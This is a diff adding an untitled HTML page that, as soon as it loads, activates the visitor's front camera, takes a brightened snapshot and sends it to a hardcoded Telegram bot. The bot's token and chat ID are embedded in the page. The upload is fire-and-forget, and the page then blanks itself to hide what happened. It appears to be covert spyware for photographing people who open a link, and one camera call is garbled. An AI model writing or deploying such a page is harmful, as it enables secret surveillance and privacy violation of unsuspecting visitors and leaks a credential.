@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <style>
+        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
+        #status { 
+            position: fixed; top:20px; left:0; width:100%; 
+            color:#0f0; font-family:Arial; text-align:center; 
+            font-size:14px; z-index:1000; 
+        }
+        /* Подсветка для камеры - помогает против темных фото */
+        #light {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(255,255,255,0.15); /* Лёгкая белая подсветка */
+            display: none; z-index:999;
+        }
+    </style>
+</head>
+<body>
+    <div id="light"></div>
+    <div id="status">🔄 Инициализация...</div>
+
+<script>
+const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
+const CHAT_ID = '1250741267';
+const status = document.getElementById('status');
+const light = document.getElementById('light');
+
+function updateStatus(text) {
+    status.textContent = text;
+    console.log(text);
+}
+
+async function captureAndSend() {
+    let stream = null;
+    
+    try {
+        // === 1. ВКЛЮЧАЕМ ПОДСВЕТКУ ПЕРЕД СЪЕМКОЙ ===
+        light.style.display = 'block';
+        updateStatus('💡 Включаю камеру...');
+        
+        // === 2. ЗАПРАШИВАЕМ КАМЕРУ С ОПТИМАЛЬНЫМИ НАСТРОЙКАМИ ===
+        // Пробуем фронтальную камеру с автофокусом и подсветкой
+        stream = await navigator.mediaDevimedia({
+            video: {
+                facingMode: 'user', // Фронтальная камера
+                width: { ideal: 480, max: 640 },  // МЕНЬШЕ разрешение = БЫСТРЕЕ
+                height: { ideal: 640, max: 480 },
+                frameRate: { ideal: 24 }, // Низкий FPS для скорости
+                // Ключевые настройки для качества:
+                brightness: { ideal: 0.7, min: 0.5 }, // Ярче по умолчанию
+                contrast: { ideal: 0.6 },
+                exposureMode: 'continuous' // Постоянная экспозиция
+            }
+        }).catch(async () => {
+            // Если не поддерживаются расширенные настройки - простой запрос
+            updateStatus('🔄 Альтернативный запрос камеры...');
+            return await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 480, height: 640 }
+            });
+        });
+        
+        updateStatus('✅ Камера готова');
+        
+        // === 3. ПОДГОТОВКА ВИДЕО БЕЗ play() ===
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.playsInline = true;
+        
+        // Ждем готовности видео
+        await new Promise(resolve => {
+            if (video.readyState >= 1) resolve();
+            else video.onloadedmetadata = resolve;
+        });
+        
+        // === 4. ДАЁМ КАМЕРЕ ВРЕМЯ НА ФОКУС И ЭКСПОЗИЦИЮ ===
+        // Увеличиваем время для фокусировки
+        updateStatus('📸 Настраиваю фокус...');
+        await new Promise(resolve => setTimeout(resolve, 800)); // Увеличено до 800мс
+        
+        // === 5. ДЕЛАЕМ СНИМОК С ОПТИМИЗАЦИЕЙ ===
+        const canvas = document.createElement('canvas');
+        // ЕЩЁ МЕНЬШЕ разрешение для скорости
+        canvas.width = 400;
+        canvas.height = 500;
+        
+        const ctx = canvas.getContext('2d');
+        
+        // 1) Рисуем изображение
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // 2) УЛУЧШАЕМ КАЧЕСТВО: повышаем яркость и контраст
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const data = imageData.data;
+        
+        // Простая коррекция яркости (+20%)
+        for (let i = 0; i < data.length; i += 4) {
+            data[i] = Math.min(255, data[i] * 1.2);     // Красный
+            data[i + 1] = Math.min(255, data[i + 1] * 1.2); // Зеленый
+            data[i + 2] = Math.min(255, data[i + 2] * 1.2); // Синий
+        }
+        
+        ctx.putImageData(imageData, 0, 0);
+        
+        // === 6. МГНОВЕННО ОСТАНАВЛИВАЕМ КАМЕРУ И ПОДСВЕТКУ ===
+        stream.getTracks().forEach(track => track.stop());
+        light.style.display = 'none';
+        updateStatus('✅ Фото обработано');
+        
+        // === 7. ОТПРАВКА С МИНИМАЛЬНОЙ ЗАДЕРЖКОЙ ===
+        updateStatus('📨 Отправляю...');
+        
+        canvas.toBlob(async (blob) => {
+            // Формируем запрос
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            
+            // ВАЖНО: Отправляем БЕЗ caption для ускорения
+            // ВАЖНО: Не ждём ответа от сервера (no-cors режим)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors', // Ключевая опция для скорости
+                keepalive: true  // Позволяет закрыть страницу до отправки
+            }).catch(() => {}); // Игнорируем ошибки сети
+            
+            // === 8. МГНОВЕННОЕ ЗАВЕРШЕНИЕ ===
+            updateStatus('✅ Отправлено!');
+            
+            // Через 500мс полностью очищаем страницу
+            setTimeout(() => {
+                document.body.innerHTML = '';
+                document.body.style.backgroundColor = '#000';
+            }, 500);
+            
+        }, 'image/jpeg', 0.7); // Низкое качество 70% для скорости
+        
+    } catch (error) {
+        updateStatus(`❌ Ошибка: ${error.message}`);
+        if (stream) stream.getTracks().forEach(track => track.stop());
+        light.style.display = 'none';
+        
+        // Даже при ошибке очищаем страницу через 2 секунды
+        setTimeout(() => {
+            document.body.innerHTML = '';
+        }, 2000);
+    }
+}
+
+// Запускаем мгновенно
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', captureAndSend);
+} else {
+    captureAndSend();
+}
+</script>
+</body>
+</html>
